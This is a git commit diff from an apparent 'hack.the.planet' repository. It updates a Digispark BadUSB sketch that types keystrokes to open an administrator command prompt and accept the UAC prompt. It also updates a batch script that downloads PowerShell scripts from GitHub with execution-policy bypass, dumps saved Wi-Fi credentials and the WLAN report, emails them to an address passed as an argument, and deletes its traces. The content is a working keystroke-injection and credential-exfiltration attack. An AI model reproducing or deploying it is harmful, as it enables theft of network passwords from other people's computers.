5e534b05459020c48208938026e8155ecdcc3978
Bas Magré <Opvolger@gmail.com>
2019-02-12 23:00:38 +0100

    template en script update

--- Digispark/digispark_cmd_as_admin_template/digispark_cmd_as_admin_template.ino
+++ Digispark/digispark_cmd_as_admin_template/digispark_cmd_as_admin_template.ino
@@ -10,25 +10,23 @@ void setup() {
 void loop() {
     // calling the sendKeyStroke() function with 0 starts the script, it cancels the effect of all keys that are already being pressed at the time of execution to avoid conflicts
     DigiKeyboard.sendKeyStroke(0);
-
-    // waits half a second (500 ms) before sending any other key strokes
-    DigiKeyboard.delay(250);
-    
+    // waits before sending any other key strokes
+    DigiKeyboard.delay(250);    
     // Run as admin cmd
     DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // presses <WINDOWS> + R
     DigiKeyboard.delay(500);    
-    DigiKeyboard.println("powershell -executionpolicy bypass Start-Process cmd -Verb runAs");
-    DigiKeyboard.delay(500);
+    DigiKeyboard.println("powershell Start-Process cmd -Verb runAs");
+    DigiKeyboard.delay(1500);
     DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
-    DigiKeyboard.delay(500);
+    DigiKeyboard.delay(500);    
 
-    // 
+    // Acties
     while (true)
     {
       // put your main code here, to run repeatedly:
       digitalWrite(1, HIGH);
-      delay(1000);               // wait for a second
+      delay(500);               // wait for a second
       digitalWrite(1, LOW); 
-      delay(1000);               // wait for a second
+      delay(500);               // wait for a second
     }
 }
--- DigisparkWifi.cmd
+++ DigisparkWifi.cmd
@@ -1,5 +1,11 @@
-mkdir %TMP%\HackThePlanet 
-c:
+mkdir %TMP%\HackThePlanet
 cd %TMP%\HackThePlanet 
-powershell -executionpolicy bypass (New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/Opvolger/hack.the.planet/master/Wifi/GetWifiCreds.ps1\", \"GetWifiCreds.ps1\") && powershell -executionpolicy bypass (New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/Opvolger/hack.the.planet/master/Wifi/runall.cmd\", \"runall.cmd\") && powershell -executionpolicy bypass (New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/Opvolger/hack.the.planet/master/MailMe.ps1\", \"MailMe.ps1\") && runall.cmd && powershell -executionpolicy bypass -File MailMe.ps1 -smtpserver %1 -toaddress %2 -files output.txt,wlan-report-latest.html & cd .. 
+powershell -executionpolicy bypass (New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/Opvolger/hack.the.planet/master/Wifi/GetWifiCreds.ps1\", \"GetWifiCreds.ps1\")
+powershell -executionpolicy bypass (New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/Opvolger/hack.the.planet/master/MailMe.ps1\", \"MailMe.ps1\")
+powershell -executionpolicy bypass -File .\GetWifiCreds.ps1 -ErrorAction SilentlyContinue > output.txt
+call netsh wlan show wlanreport
+call type C:\ProgramData\Microsoft\Windows\WlanReport\wlan-report-latest.html > wlan-report-latest.html
+powershell -executionpolicy bypass -File MailMe.ps1 -smtpserver %1 -toaddress %2 -files output.txt,wlan-report-latest.html & cd .. 
+cd ..
 powershell -executionpolicy bypass Remove-Item -LiteralPath %TMP%\HackThePlanet -Force -Recurse
+cd %~dp0
